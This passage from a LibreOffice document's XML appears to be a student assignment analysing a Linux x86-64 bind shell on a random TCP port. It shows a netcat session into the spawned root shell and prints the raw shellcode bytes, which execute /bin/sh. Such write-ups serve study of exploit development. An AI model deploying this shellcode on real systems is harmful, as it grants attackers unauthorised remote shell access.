      <text:p text:style-name="P32"/>
      <text:p text:style-name="P23"><text:span text:style-name="T42"><text:tab/></text:span><text:span text:style-name="T29">get the shell :</text:span></text:p>
      <text:p text:style-name="P63"/>
      <text:p text:style-name="P63"><draw:rect text:anchor-type="paragraph" draw:z-index="28" draw:style-name="gr1" draw:text-style-name="P86" svg:width="4.0815in" svg:height="2.7587in" svg:x="-0.0193in" svg:y="0.1071in"><text:p/></draw:rect><text:tab/></text:p>
      <text:p text:style-name="P32"><text:tab/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T44">*</text:span><text:span text:style-name="T46">*****# nc localhost 35588 </text:span></text:p>
      <text:p text:style-name="P32"><text:s/>ps </text:p>
      <text:p text:style-name="P32"><text:s text:c="3"/>PID TTY <text:s text:c="9"/>TIME CMD </text:p>
      <text:p text:style-name="P32"><text:s text:c="2"/>3330 pts/0 <text:s text:c="3"/>00:00:00 bash </text:p>
      <text:p text:style-name="P32"><text:s/>11500 pts/0 <text:s text:c="3"/>00:00:00 sh </text:p>
      <text:p text:style-name="P32"><text:s/>11527 pts/0 <text:s text:c="3"/>00:00:00 ps </text:p>
      <text:p text:style-name="P32"><text:s/>ls </text:p>
      <text:p text:style-name="P32"><text:s/>bind_tcp_random_port_analysis.odt </text:p>
      <text:p text:style-name="P32"><text:s/>bind_tcp_random_port_analysis.pdf </text:p>
      <text:p text:style-name="P32"><text:s/>shellcode </text:p>
      <text:p text:style-name="P32"><text:s/>pwd </text:p>
      <text:p text:style-name="P32"><text:s/>/root/Desktop/Exam/Assignment5/shell_bind_tcp_random </text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P29"><draw:rect text:anchor-type="paragraph" draw:z-index="36" draw:style-name="gr1" draw:text-style-name="P86" svg:width="4.8252in" svg:height="1.326in" svg:x="-0.0193in" svg:y="0.172in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P29"><text:s/>shellcode:</text:p>
      <text:p text:style-name="P29">unsigned char buf[] = </text:p>
      <text:p text:style-name="P29">"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05" </text:p>
      <text:p text:style-name="P29">"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48" </text:p>
      <text:p text:style-name="P29">"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62" </text:p>
      <text:p text:style-name="P29">"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05"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24:40.618409769</meta:creation-date>
    <meta:generator>LibreOffice/4.1.0.4$Linux_X86_64 LibreOffice_project/410m0$Build-4</meta:generator>
    <dc:date>2014-07-27T10:47:45.301138932</dc:date>
    <meta:editing-duration>PT19H12M12S</meta:editing-duration>
    <meta:editing-cycles>14</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="6" meta:paragraph-count="203" meta:word-count="1245" meta:character-count="9555" meta:non-whitespace-character-count="6936"/>
  </office:meta>
</office:document-meta>
</file>